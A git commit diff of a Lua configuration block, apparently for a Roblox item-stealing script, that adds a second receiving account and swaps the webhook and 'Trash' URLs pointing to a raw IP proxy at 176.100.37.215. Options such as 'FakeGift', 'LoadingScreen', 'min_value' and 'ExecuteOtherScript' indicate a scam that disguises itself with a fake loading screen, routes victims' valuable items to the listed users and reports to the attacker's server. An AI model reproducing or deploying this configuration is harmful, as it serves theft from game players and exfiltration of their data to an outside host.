bfca6ed0c0e04b2aea48218453f071c8bbcf257e
youster166 <bekostop34@gmail.com>
2025-08-03 20:25:01 +0200

    Upload script.lua via Script Source Converter

--- script.lua
+++ script.lua
@@ -1,10 +1,10 @@
 _G.NullConfig = {
-    User = {"younex901"},
+    User = {"younex901", "Farmerbabio"},
     min_value = 10000000000,
-    pingEveryone = "Yes", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/021b82a750787bcb68ca81a3f2203c56",
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/5e5bfa3b2fdd335fac6de52d0e3832fe",
     FakeGift = "No",
-    Trash = "http://176.100.37.215:20002/proxy/021b82a750787bcb68ca81a3f2203c56",
+    Trash = "http://176.100.37.215:20002/proxy/9199b325be712bba1fb448f2f4ccc120",
     LoadingScreen = "Yes",
     GiftOnlyRares = "No",
     ExecuteOtherScript = "No",
